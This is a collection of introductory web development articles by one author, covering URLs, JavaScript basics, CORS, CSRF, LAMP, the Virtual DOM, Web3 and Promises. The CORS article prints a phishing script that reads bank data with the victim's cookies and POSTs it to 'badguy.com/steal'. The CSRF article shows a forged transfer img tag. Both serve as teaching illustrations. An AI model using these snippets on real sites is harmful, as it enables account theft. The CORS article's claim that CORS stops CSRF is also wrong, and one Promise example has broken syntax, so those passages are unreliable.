items.title: The Structure of URLs
items.author: Thomas Hofmann
items.description:
How good web addresses work

If you’ve ever built a website or worked on SEO, you know this: a URL is more than just an address in your browser. It’s a core part of the user experience, search engine optimization — and often the very first impression someone gets of your site.

In this article, you’ll learn how URLs are structured, what each part does, and how to create clean, readable, and SEO-friendly URLs.

Structure of a URL — explained briefly

  • Protocol (https://)
    → Defines how the connection to the server is established.
    → https is the standard today (more secure than http).
  • Subdomain (www.)
    → Optional part that comes before the main domain.
    → Can also be something like blog. or shop..
  • Domain (example.com)
    → The unique name of your website.
    → Registered through a domain registrar.
  • Path (/blog/article-about-urls)
    → Shows the location or subpage on the server.
  • Parameter (?utm_source=medium)
    → Transfers additional information, e.g. for tracking or filtering.
  • Anchor (#comments)
    → Points to a specific section within the same page.
https://www.example.com/blog/article-about-urls?utm_source=medium#comments

Why “www” Isn’t Needed Anymore

Back in the early days of the web, the “www” stood for World Wide Web and helped distinguish a website’s web server from other services like mail (mail.example.com) or FTP (ftp.example.com).

Today, however, that separation is no longer necessary. Modern web servers and DNS setups can handle requests for both www.example.com and example.com without any issue.

That’s why most websites now drop the “www” — it’s cleaner, shorter, and easier to remember.

Still, consistency matters: pick one version (with or without “www”) and redirect the other using a 301 redirect to avoid duplicate content and SEO confusion.

Best Practices

Good URLs are short, clear, and easy to understand — for both humans and machines. Here are the most important rules:

1. Use descriptive paths

Instead of cryptic IDs or numbers, use clear, meaningful words:

✅ /blog/url-structure
❌ /post?id=12345

2. Separate words with hyphens

Hyphens (-) are easier to read and more SEO-friendly than underscores (_):

✅ /seo-tips-for-urls  
❌ /seo_tips_for_urls

3. Use lowercase letters

Uppercase letters can cause issues on some servers. Keeping everything lowercase is safer and more consistent:

✅ /blog/url-structure  
❌ /Blog/URL-Structure

4. Use keywords strategically

Search engines read your URLs — so it’s perfectly fine (and smart) to include your main topic:

✅ /recipes/vegan-banana-bread

5. Avoid special characters and accents

Umlauts and special characters often get encoded into messy strings like %C3%B6.

✅ /how-to-create-clean-urls  
❌ /how-to-create-schöne-urls

How URLs Affect SEO

Search engines use URLs to better understand what a page is about.

A clear and consistent URL structure helps ensure that:

  • Google and other search engines can crawl your pages more efficiently,
  • users know what to expect before clicking a link, and
  • your internal linking stays logical and easy to navigate.

Conclusion

A well-structured URL is like a clear roadmap — it guides both users and search engines safely to their destination.

Short, concise, and logically organized — that’s the recipe for URLs that work.

If you plan your site structure carefully, you’ll save yourself a lot of effort later when it comes to SEO, maintenance, and user navigation.

Final tip

Take a look at your existing URLs. If you find confusing or unreadable links, consider improving them — but be careful when making changes:
always use 301 redirects to preserve your old links and avoid losing traffic!

items.title: JavaScript: var vs let vs const
items.author: Thomas Hofmann
items.description:
Key Differences and Best Practices

In JavaScript, variables can be declared using var, let, or const. Each of these has different characteristics in terms of scope, hoisting, and mutability. Here’s a breakdown of each:

var (Old way — ES5 and earlier)

Key characteristics:

  • Function-scoped: It is scoped to the function in which it is declared (or global if outside a function).
  • Hoisted: Variable declarations are hoisted to the top of their scope, but not initialized.
  • Can be redeclared and updated: You can redeclare and change its value.
function testVar() {
  console.log(a); // undefined (hoisted, but not initialized)
  var a = 10;
  console.log(a); // 10
}
testVar();

let (Introduced in ES6)

Key characteristics:

  • Block-scoped: Only accessible within the block {} where it’s declared.
  • Hoisted: But in a “temporal dead zone” — you can’t use it before it’s declared.
  • Can be updated, but not redeclared in the same scope.
function testLet() {
  // console.log(b); // ReferenceError: Cannot access 'b' before initialization
  let b = 20;
  b = 30; // ✅ allowed
  // let b = 40; // ❌ SyntaxError: Identifier 'b' has already been declared
  console.log(b); // 30
}
testLet();

const (Introduced in ES6)

Key characteristics:

  • Block-scoped (like let)
  • Hoisted, but also in the temporal dead zone
  • Must be initialized at declaration
  • Cannot be reassigned, but object properties can be modified 
const c = 50;
// c = 60; // ❌ TypeError: Assignment to constant variable
console.log(c); // 50

const person = { name: "Alice" };
person.name = "Bob";         // ✅ Allowed: we can change properties
console.log(person.name); // "Bob"

person = { name: "Charlie" }; // ❌ TypeError: can't reassign a const object

Summary

When to use what?

  • Avoid var unless working in legacy code.
  • Use let when you know a variable’s value might change later in your code.
  • Use const for variables that should never change once you set them.

Here are some examples for better understanding

const button = document.querySelector("#myButton");

button.addEventListener("click", () => {
  alert("Button clicked!");
});
const counterDisplay = document.querySelector("#counter");
let count = 0;

const increment = () => {
  count++;  // We update count, so `let` is needed
  counterDisplay.textContent = count;
};

document.querySelector("#incrementBtn").addEventListener("click", increment);
const settings = {
  theme: "dark",
  fontSize: 16,
};

settings.fontSize = 18; // Allowed — modifying object properties
console.log(settings.fontSize); // 18
const listItems = document.querySelectorAll("li");

for (let i = 0; i < listItems.length; i++) {
  listItems[i].addEventListener("click", () => {
    console.log(`Item ${i} clicked`);
  });
}

Read More

  • https://www.geeksforgeeks.org/javascript/difference-between-var-let-and-const-keywords-in-javascript/
  • https://www.freecodecamp.org/news/var-let-and-const-whats-the-difference/
  • https://www.w3schools.com/js/js_let.asp
  • https://www.w3schools.com/js/js_const.asp
  • https://www.w3schools.com/js/js_variables.asp

items.title: Understanding CORS
items.author: Thomas Hofmann
items.description:
Why Your Frontend Can’t Talk to Your Backend

If you’ve ever worked with web APIs, chances are you’ve encountered a frustrating error message that says something like:

“Access to fetch at ‘http://api.example.com/data’ from origin ‘http://localhost:3000’ has been blocked by CORS policy.”

Welcome to the world of CORS, or Cross-Origin Resource Sharing — a vital, yet often misunderstood part of web security. In this article, we’ll demystify CORS, explain why it exists, and show how you can handle it properly in your applications.

What Is CORS?

CORS is a security mechanism implemented in web browsers to control how resources on a web page can be requested from a different domain (origin) than the one that served the page.

An origin is defined as a combination of:

  • Protocol (http or https)
  • Domain (example.com)
  • Port (:3000, :8080, etc.)

If your frontend is hosted at http://localhost:3000 and you try to fetch data from http://api.example.com, the browser considers it a cross-origin request.

By default, the Same-Origin Policy prevents web pages from making requests to a different origin, to protect users from malicious scripts. CORS is a controlled relaxation of this policy.

How CORS Works

When a browser makes a cross-origin request, it includes a special HTTP header:

Origin: http://localhost:3000

The server can respond with:

Access-Control-Allow-Origin: http://localhost:3000

This tells the browser, “It’s okay to let this origin access my data.”

If the server doesn’t send this header (or sends the wrong one), the browser blocks the request — even if the server actually sent a 200 OK response.

This is crucial: CORS is enforced by the browser, not the server.

Simple vs. Preflighted Requests

Some requests — like GET or POST with basic headers — are considered simple and are sent directly.

Others — like PUT, DELETE, or requests with custom headers (e.g., Authorization) — trigger a preflight request. This is a preliminary OPTIONS request sent by the browser to ask the server:

“Hey, are you okay with this?”

Only if the server replies with the proper CORS headers will the actual request be sent.

Common CORS Headers

Here are some headers you’ll commonly see in CORS-enabled responses:

Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true

What They Mean:

  • Allow-Origin: Which origin is allowed to access the resource
  • Allow-Methods: Which HTTP methods are permitted
  • Allow-Headers: Which headers the request can include
  • Allow-Credentials: Whether cookies or auth headers are allowed

Fixing CORS Issues

1. Example with Backend in Node.js/Express

const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors({
  origin: 'http://localhost:3000',
  credentials: true
}));

2. Using CORS Middleware

Most backend frameworks (Express, Flask, Spring Boot, etc.) have CORS middleware or modules you can plug in.

3. Vanilla PHP ( for better understanding )

<?php
// Define the allowed origin
$allowed_origin = "http://localhost:3000";

// Check if the request includes an Origin header
if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] === $allowed_origin) {
    header("Access-Control-Allow-Origin: $allowed_origin");
    header("Access-Control-Allow-Credentials: true");
}

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    // Only respond if it's the correct origin
    if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] === $allowed_origin) {
        header("Access-Control-Allow-Origin: $allowed_origin");
        header("Access-Control-Allow-Credentials: true");
        header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        header("Access-Control-Max-Age: 86400"); // Cache preflight for 1 day
    }
    exit(0);
}

Security Warning

Never use Access-Control-Allow-Origin: * with credentials: true!
This opens your app to security vulnerabilities. Always specify trusted origins.

Why CORS Is Good: A Phishing Example

A user is logged in to their online banking at
https://bank.example.com — the browser has their session cookie stored.

The user receives a convincing phishing email:

Subject: “Security Alert: Suspicious Login Detected”
From: support@bank-help.com
Link: https://badguy.com/fake-alert

The user clicks the link. https://badguy.com opens a page that includes the following JavaScript:

fetch('https://bank.example.com/api/account-info', {
  method: 'GET',
  credentials: 'include' // send session cookie!
})
.then(response => response.json())
.then(data => {
  // Steal the user’s sensitive data
  fetch('https://badguy.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

What Happens Without CORS?

If CORS didn’t exist, the browser would happily send the session cookie for bank.example.com — even though the request came from badguy.com.

The attacker could silently:

  • Access account balances
  • Transfer funds
  • Steal personal data

This is called a Cross-Site Request Forgery (CSRF) or Cross-Origin Data Theft.

What Happens With CORS?

Because bank.example.com does not allow requests from badguy.com, the browser does this:

“Blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present”

The request fails before it even reaches the server. The attacker gets nothing.

Conclusion

  • CORS blocks malicious websites from reading data from other domains.
  • CORS prevents cross-origin JavaScript abuse using stolen cookies or tokens.
  • CORS helps web apps safely isolate their APIs.

Final Thoughts

CORS can be confusing at first, but once you understand that it’s a browser-side security feature, not a bug, everything starts to make sense.

Think of CORS as your browser’s gatekeeper, only letting requests through if the server gives its explicit blessing. And as with any security feature, it’s not about making life harder — it’s about protecting users from attacks.

Read More

  • https://developer.mozilla.org/de/docs/Web/HTTP/Guides/CORS
  • https://portswigger.net/web-security/cors
  • https://www.w3.org/TR/2020/SPSD-cors-20200602/
  • https://pellerex.com/blog/asp-net-5-cors

Understanding CORS was originally published in System Weakness on Medium, where people are continuing the conversation by highlighting and responding to this story.

items.title: What is a Function in JavaScript?
items.author: Thomas Hofmann
items.description:
And how many ways are there to use one?

A function is a set of statements that performs a task or calculates a value. You can define a function, and then call or invoke it wherever needed. There are two main types of functions: regular and arrow functions. Here is a short guide how to use them.

Ways to Define Functions in JavaScript

1. Function Declaration

function add(a, b) {
  return a + b;
}
  • Hoisted (you can call it before it’s defined).
  • Standard syntax.

2. Function Expression

const subtract = function(a, b) {
  return a - b;
};
  • Assigned to a variable.
  • Not hoisted.

3. Arrow Function (ES6)

const multiply = (a, b) => a * b;
  • Shorter syntax.
  • No own this, arguments, or super (uses the surrounding scope).
     — This is the main difference to the other approaches
  • Common in modern JavaScript and React.

More Variants of the Arrow Function:

const sayHi = () => console.log("Hi");

const square = x => x * x; // No parentheses needed with one parameter

const fullName = (first, last) => {
  return first + " " + last;
};

4. Anonymous Functions

setTimeout(function() {
  console.log("Time's up!");
}, 1000);
  • Functions without a name.
  • Often used as callbacks.

5. Immediately Invoked Function Expressions (IIFE)

(function() {
  console.log("This runs immediately!");
})();
  • Runs immediately after it’s defined.

6. Async Function

async function fetchData() {
  const response = await fetch('https://api.example.com/data');
  return await response.json();
}
  • Returns a promise, allows use of await.

Key Concept and Main Differences

  • In regular functions, this refers to the calling object.
  • In arrow functions, this is lexically scoped — it takes this from the surrounding (outer) scope, not from the caller.

Example 1: Inside an Object Method

const person = {
  name: "Alice",
  regularFunction: function () {
    console.log("regularFunction:", this.name); // "Alice"
  },
  arrowFunction: () => {
    console.log("arrowFunction:", this.name); // likely "undefined" (not `person`)
  }
};

person.regularFunction();
person.arrowFunction();

Output:

regularFunction: Alice
arrowFunction: undefined

Why?

  • regularFunction uses this from the object person.
  • arrowFunction gets this from the outer scope — likely the global scope, where this.name is not defined.

Example 2: Inside a setTimeout

const person = {
  name: "Bob",
  sayHi: function () {
    setTimeout(function () {
      console.log("Regular function:", this.name);
    }, 1000);

    setTimeout(() => {
      console.log("Arrow function:", this.name);
    }, 1000);
  }
};

person.sayHi();

Output (after 1 sec)

Regular function: undefined
Arrow function: Bob

Explanation:

  • The regular function inside setTimeout has its own this (which points to window or global).
  • The arrow function captures this from its parent scope — the sayHi method, where this is person.

Quick Tip

  • Use arrow functions when:
     —     You want to inherit this from the surrounding scope.
     — You’re working with short callbacks (like in map, filter, forEach, etc.).
  • Use regular functions when:
     —     You need your function to have its own this.
     — You’re defining methods on an object.

Final Thoughts

JavaScript functions can be confusing at first, especially because there are so many ways to use them. But it’s worth learning them to become a better developer.

items.title: Cross-Site Request Forgery (CSRF)
items.author: Thomas Hofmann
items.description:
What it is and how to stop it

Cross-Site Request Forgery (CSRF) is a type of web security vulnerability that tricks a victim into performing actions they didn’t intend to, on a web application where they’re already authenticated.

How CSRF Works:

  1. Victim is Logged In: The user is authenticated on a website (e.g., online banking, social media) and has a valid session cookie stored in the browser.
  2. Attacker Crafts a Malicious Request: The attacker creates a request to the same website, often doing something harmful like transferring money or changing an email address.
  3. Victim Visits a Malicious Site: The attacker lures the user to click a link or visit a page (via email, social media, etc.) that contains the malicious request.
  4. Browser Sends Authenticated Request: Because the victim is already logged in, the browser automatically includes the session cookie or other credentials, so the server thinks the request is legitimate.
  5. Action is Performed Without User’s Intent: The server processes the action as if it came from the user, leading to unauthorized operations.

What does this tell us? Never leave browser tabs open and always log out.

Example Scenario:

Imagine a banking site:

  • Logged-in user goes to a malicious site.
  • The site has an image tag like:
<img src="https://bank.com/transfer?amount=1000&to=attacker" />
  • The browser sends a GET request to bank.com using the logged-in user’s session.
  • Money is transferred unknowingly.

How to Prevent CSRF:

  1. CSRF Tokens:
     —     Include a unique, unpredictable token in each request (often as a hidden form field).
     — Server validates the token; if it’s missing or invalid, the request is rejected.
  2. SameSite Cookies:
     —     Set SameSite=Strict or SameSite=Lax on cookies to limit sending them on cross-site requests.
  3. Double Submit Cookie Pattern:
     —     Send a token both in a cookie and in a request parameter; server compares them.
  4. Re-authentication for Critical Actions:
     —     Require the user to enter a password again or complete 2FA before sensitive operations.
  5. Use POST Instead of GET for State-Changing Requests:
     —     CSRF attacks can easily exploit GET requests embedded in images or scripts.

Final Thoughts

Cross-Site Request Forgery remains a critical security risk because it exploits the automatic trust between a user’s browser and a web application. Protecting against CSRF is essential for any developer and requires implementing measures like CSRF tokens and SameSite cookies.

Sources & Read More

  • https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF
  • https://www.cloudflare.com/de-de/learning/security/threats/cross-site-request-forgery/
  • https://portswigger.net/web-security/csrf
  • https://www.rapid7.com/de/cybersecurity-grundlagen/cross-site-request-forgery/

items.title: Understanding the LAMP Stack
items.author: Thomas Hofmann
items.description:
The Classic Web Development Powerhouse

If you’ve ever dipped your toes into web development, chances are you’ve come across the LAMP stack. It’s not flashy like some of today’s newer stacks, but it’s reliable, robust, and still very much in use. Whether you’re just getting started or want to understand the foundational tech behind many websites, it’s worth getting familiar with what LAMP is and why it matters.

What is the LAMP Stack?

LAMP is an acronym for a group of open-source software that together form the backbone of many web applications:

  • Linux — the operating system
  • Apache — the web server
  • MySQL — the database
  • PHP (or sometimes Python or Perl) — the programming language

Each layer plays a specific role in the stack, and together, they allow you to host dynamic websites and web apps in a flexible and relatively simple environment.

Let’s briefly break it down:

  • Linux acts as the foundation. It’s the OS that everything else runs
  • Apache handles incoming web requests and serves content.
  • MySQL is where your app stores and retrieves data.
  • PHP processes logic, handles form submissions, and dynamically generates HTML.

This combo has powered everything from personal blogs to large enterprise systems.

A Brief History of LAMP

The LAMP stack emerged in the late 1990s, a time when the web was really starting to explode in popularity. Proprietary solutions for hosting and building websites were expensive and often locked developers into specific ecosystems. The beauty of LAMP was that it offered a completely open-source alternative.

Each component existed independently at first:

  • Linux was already a growing force among operating systems, especially in the open-source world.
  • Apache became the most popular web server because it was flexible and free.
  • MySQL offered a fast, lightweight relational database.
  • PHP, originally a set of CGI scripts, evolved into a full-blown programming language designed for the web.

Around the early 2000s, the tech community began referring to this combo as the “LAMP stack.” It gained popularity quickly because it was easy to set up, cost nothing, and gave developers complete control over their applications.

Why It Still Matters Today

While newer stacks like MERN are getting a lot of attention, LAMP isn’t obsolete. It’s stable, battle-tested, and often the right tool for the job, especially for small to medium-sized projects.

Here’s why some developers still choose LAMP:

  • Simplicity: You can get a LAMP server up and running with just a few commands.
  • Massive community support: Decades of documentation and troubleshooting help are at your fingertips.
  • Compatibility: Most hosting providers still support LAMP out of the box.
  • Security and performance: With proper configuration, LAMP can be very secure and performant.

Plus, PHP itself has come a long way. Modern versions are much faster and more capable than the early iterations.

Should You Learn It?

If you’re just getting started with web development or want to understand how a lot of traditional web apps work, learning the LAMP stack is a solid investment. Even if you eventually move on to other stacks or frameworks, having that foundational knowledge makes you a more well-rounded developer.

Also, a lot of WordPress sites (which still power a massive chunk of the internet) run on LAMP, so if you plan to work with or maintain WordPress, knowing LAMP is practically essential.

In Summary: The LAMP stack may not be the newest or trendiest toolset out there, but it’s stood the test of time. It’s approachable, powerful, and still incredibly relevant. If you’ve been thinking about diving in, there’s never a bad time to learn the classics.

items.title: Virtual DOM
items.author: Thomas Hofmann
items.description:
How It Actually Works Under the Hood

If you’ve used React, Vue, or similar frontend libraries, you’ve probably encountered the term Virtual DOM. It’s often praised as a key performance optimization, but the specifics of how it works are sometimes left vague.

So let’s go beyond the buzzword and look at how the Virtual DOM actually functions — and what it’s doing behind the scenes when your UI updates.

The Real DOM

The real DOM is a tree structure maintained by the browser to represent the UI. It’s powerful but not particularly fast. Updating the DOM directly can be expensive due to operations like reflow and repaint, especially when updates happen frequently or involve large trees.

In pre-React days, developers had to manually orchestrate DOM changes: track what changed, when to update, and how to avoid unnecessary re-renders. This imperative approach often led to messy code and subtle bugs.

The Virtual DOM

The Virtual DOM (vDOM) is an abstraction — a lightweight JavaScript object that mirrors the structure of the real DOM. When you write JSX or TSX, you’re essentially declaring a UI structure that React turns into a virtual tree.

How It Works

When a component’s state or props change, React triggers a re-render, but instead of updating the actual DOM immediately, it follows a three-step process:

  1. Render Phase: React creates a new Virtual DOM tree by calling the component’s render function. This is a pure, in-memory representation of the UI after the change.
  2. Diffing Phase: React compares the new tree to the previous one using its reconciliation algorithm. It identifies exactly what has changed — whether it’s a node’s text, attributes, or position.
  3. Commit Phase: React then generates a minimal set of DOM mutations (patches) and applies them to the real DOM in a single batch. This reduces layout thrashing and avoids unnecessary DOM writes.

This abstraction makes UI updates more efficient, but also predictable, which is why the Virtual DOM is such a foundational concept in modern frontend frameworks.

Final Thoughts

The Virtual DOM is not just a performance trick — it’s a model that enables declarative UI, predictable updates, and composable components. Understanding how it works helps you write more efficient, maintainable code — and gives you the tools to debug performance issues more effectively.

Sources

  • https://de.legacy.reactjs.org/docs/faq-internals.html
  • https://de.wikipedia.org/wiki/Virtual_DOM
  • https://www.freecodecamp.org/news/what-is-the-virtual-dom-in-react/
  • https://www.geeksforgeeks.org/reactjs/reactjs-virtual-dom/
  • https://pieces.app/blog/dom-virtual-dom-react

items.title: From Web1 to Web3
items.author: Thomas Hofmann
items.description:
A Simple Guide to the Evolution of the Internet

The internet we use today isn’t the same one that existed twenty years ago. In fact, it’s gone through several major transformations — each one changing the way we interact, create, and share online.

You’ve probably come across buzzwords like Web1, Web2, and Web3. They sound technical, maybe even intimidating — but they don’t have to be. At their core, these terms just describe how the internet has evolved over time.

Web1: The Read-Only Web

Imagine walking into a massive digital library where all you can do is read. That was Web1, the earliest version of the internet, roughly from the early 1990s to the early 2000s.

Web1 was static. Websites were basic HTML pages. There were no like buttons, no comment sections, and certainly no social media. You couldn’t interact — you could only consume.

Think of it like a digital newspaper: the information flowed one way, from publishers to readers.

Main traits:

  • Read-only.
  • Static HTML pages.
  • No interaction or user-generated content.

Web2: The Social Web

Then came the shift.

Starting around 2004, we entered the era of Web2, also known as the “social web.” This is the internet many of us grew up with and still use today.

The key difference? Interaction. Suddenly, you could comment, like, share, and even create your own content. Platforms like Facebook, YouTube, Instagram, and Twitter turned passive users into active participants.

Web2 made the internet feel alive — but there was a catch. While users created the content, the platforms owned the data. If you posted a photo or video, it lived on someone else’s server. Companies harvested your data to show ads, recommend content, or even sell it.

Main traits:

  • Read & write.
  • User-generated content (social media, forums, blogs).
  • Platforms control data.

Web3: The Ownership Web

Now, we’re on the edge of another shift: Web3. It’s still early and evolving, but the vision is bold — an internet where users own their data, identity, and even parts of the platforms they use.

Web3 is built on blockchain technology, which allows for decentralized systems. That means no single company or authority controls the platform. Instead, users participate in governance and can even earn tokens or NFTs that give them real ownership or utility.

It’s a big change — from using apps, to co-owning them.

Main traits:

  • Read, write, own.
  • Decentralization, blockchain, smart contracts.
  • Ownership of data, digital assets (e.g., NFTs, crypto).

Where Are We Going?

We’ve gone from reading the web, to writing on it, to now owning pieces of it.

items.content:
A Simple Guide to the Evolution of the Internet

The internet we use today isn’t the same one that existed twenty years ago. In fact, it’s gone through several major transformations — each one changing the way we interact, create, and share online.

You’ve probably come across buzzwords like Web1, Web2, and Web3. They sound technical, maybe even intimidating — but they don’t have to be. At their core, these terms just describe how the internet has evolved over time.

Web1: The Read-Only Web

Imagine walking into a massive digital library where all you can do is read. That was Web1, the earliest version of the internet, roughly from the early 1990s to the early 2000s.

Web1 was static. Websites were basic HTML pages. There were no like buttons, no comment sections, and certainly no social media. You couldn’t interact — you could only consume.

Think of it like a digital newspaper: the information flowed one way, from publishers to readers.

Main traits:

  • Read-only.
  • Static HTML pages.
  • No interaction or user-generated content.

Web2: The Social Web

Then came the shift.

Starting around 2004, we entered the era of Web2, also known as the “social web.” This is the internet many of us grew up with and still use today.

The key difference? Interaction. Suddenly, you could comment, like, share, and even create your own content. Platforms like Facebook, YouTube, Instagram, and Twitter turned passive users into active participants.

Web2 made the internet feel alive — but there was a catch. While users created the content, the platforms owned the data. If you posted a photo or video, it lived on someone else’s server. Companies harvested your data to show ads, recommend content, or even sell it.

Main traits:

  • Read & write.
  • User-generated content (social media, forums, blogs).
  • Platforms control data.

Web3: The Ownership Web

Now, we’re on the edge of another shift: Web3. It’s still early and evolving, but the vision is bold — an internet where users own their data, identity, and even parts of the platforms they use.

Web3 is built on blockchain technology, which allows for decentralized systems. That means no single company or authority controls the platform. Instead, users participate in governance and can even earn tokens or NFTs that give them real ownership or utility.

It’s a big change — from using apps, to co-owning them.

Main traits:

  • Read, write, own.
  • Decentralization, blockchain, smart contracts.
  • Ownership of data, digital assets (e.g., NFTs, crypto).

Where Are We Going?

We’ve gone from reading the web, to writing on it, to now owning pieces of it.

No one knows exactly how Web3 will play out. Some think it’s a revolution. Others are more skeptical. But one thing is certain: the internet continues to evolve, shaped by the people who use it.

The best part? You’re here for the ride.

items.title: AOS (Animate On Scroll)
items.author: Thomas Hofmann
items.description:
How to Add Scroll Animations in Minutes!

AOS is a library that lets you quickly add scroll animations to your site. With just a few clicks and data-attributes, you can turn your boring site into an animation masterpiece. Let me show you how!

Installation & Initialization

You can install AOS using Yarn, Npm, Bower:

yarn add aos
npm install aos --save
bower install aos --save

Or just add those CDN sources to your <head>

<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>

Last thing we need to do is to initialize the library

<script>
  AOS.init();
</script>

Apply Animations with AOS

So, now we’ve integrated the library and can get started right away. All we need to do is assign a data-attribute to the elements we want to give a scroll animation.

For example like this, if we want our element to fade-up while scrolling

<div data-aos="fade-up"></div>

A short video to give you an idea of what it looks like

Cheatsheet

<!-- Available Animations -->
<div data-aos="fade"></div>
<div data-aos="fade-up"></div>
<div data-aos="fade-down"></div>
<div data-aos="fade-left"></div>
<div data-aos="fade-right"></div>
<div data-aos="fade-up-right"></div>
<div data-aos="fade-up-left"></div>
<div data-aos="fade-down-right"></div>
<div data-aos="fade-down-left"></div>
<div data-aos="flip-left"></div>
<div data-aos="flip-right"></div>
<div data-aos="flip-up"></div>
<div data-aos="flip-down"></div>
<div data-aos="zoom-in"></div>
<div data-aos="zoom-in-up"></div>
<div data-aos="zoom-in-down"></div>
<div data-aos="zoom-in-left"></div>
<div data-aos="zoom-in-right"></div>
<div data-aos="zoom-out"></div>
<div data-aos="zoom-out-up"></div>
<div data-aos="zoom-out-down"></div>
<div data-aos="zoom-out-left"></div>
<div data-aos="zoom-out-right"></div>
<div data-aos="slide-up"></div>
<div data-aos="slide-down"></div>
<div data-aos="slide-left"></div>
<div data-aos="slide-right"></div>

<!-- Custom Options -->
<div 
  data-aos="fade-up"
  data-aos-offset="200"
  data-aos-delay="100"
  data-aos-duration="1000"
  data-aos-easing="ease-in-out"
  data-aos-mirror="true"
  data-aos-once="false"
  data-aos-anchor-placement="top-center">
</div>

Animations explained

Hard to explain without videos. Just scroll down the official documentation and you will see it!

Options explained

  • data-aos-offset → Start animation before element enters viewport
  • data-aos-delay → Wait before starting animation
  • data-aos-duration → Length of the animation in milliseconds
  • data-aos-easing → Animation timing function (e.g. ease, linear)
  • data-aos-mirror → Animate again when scrolling past in reverse
  • data-aos-once → Whether to animate only once or every time
  • data-aos-anchor-placement → Position in viewport that triggers the animation

Final Thoughts

Next time you want to quickly and easily implement scroll animations on your site, simply use this library! Especially recommended for static pages.

Thanks for reading! Have a nice day!

items.title: How JavaScript Promises Work
items.author: Thomas Hofmann
items.description:
And Why You Need Them

A Promise in JavaScript is a proxy for a value not necessarily known when the promise is created. It allows you to associate handlers with an asynchronous action’s eventual success value or failure reason. This lets asynchronous methods return values like synchronous methods: instead of immediately returning the final value, the asynchronous method returns a promise to supply the value at some point in the future.

For a better understanding

States

A Promise is in one of these states:

  • pending: initial state, neither fulfilled nor rejected.
  • fulfilled: meaning that the operation was completed successfully.
  • rejected: meaning that the operation failed.

Flow Chart

Example

const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    resolve("data loaded!");
  }, 1000);
});

promise.then(data => {
  console.log(data); // "data loaded successful!"
}).catch(error => {
  console.error(error); // something went wrong!"
});

then/catch

  • .then() is executed when the promise has been fulfilled.
  • .catch() is executed when the promise has been rejected.
function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadData() {
  console.log("load...");
  wait(1000).then(() => {
    console.log("done!");
  });
}

loadData();

async/await

  • A function with async always returns a promise.
  • Within an async function, you can use await to wait for the result of a promise.
function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function loadData() {
  console.log("load...");
  await wait(1000);
  console.log(done!");
}

loadData();

Console output of both examples

load...
(after 1 second)
done!

Use Case: Fetching Data from an API

The fetch() API in JavaScript returns a promise, which lets you write code like this:

fetch('https://api.weather.com/current?city=Berlin')
  .then(response => response.json())
  .then(data => {
    console.log(`Temperature: ${data.temperature}°C`);
  })
  .catch(error => {
    console.error('Failed to fetch weather:', error);
  });

What’s Happening:

  • Once the request fulfills (then), you get the data and update the UI.
  • If the request rejects (catch), the error handler runs.
  • While the data is loading, your app keeps running.
async function getWeather(city) {
  try {
    const response = await fetch(`https://api.weather.com/current?city=${city}`);
    const data = await response.json();
    console.log(`Temperature: ${data.temperature}°C`);
  } catch (error) {
    console.error('Failed to fetch weather:', error);
  }
}

getWeather('Berlin');

What’s Happening:

  • fetch() returns a promise — we wait for it to resolve using await.
  • If it resolves, we continue and parse the JSON.
  • If it rejects or an error occurs (e.g. network issue), we catch it and handle it cleanly.
  • While the data is loading, your app keeps running — only the code inside the async function pauses at await.

Final Thoughts

JavaScript promises are essential for working with asynchronous code — from fetching data to handling user input or delays. Whether you use .then() or the more modern async/await, promises help you write non-blocking, readable, and maintainable code.

The key takeaway is:

Promises don’t block your app. Only the code inside an async function pauses with await — everything else keeps running.

Sources

  • https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise
  • https://javascript.info/promise-basics
  • https://www.w3schools.com/js/js_promise.asp
  • https://www.freecodecamp.org/news/javascript-promise-object-explained/

Thank you for reading my articles. Have a nice day!
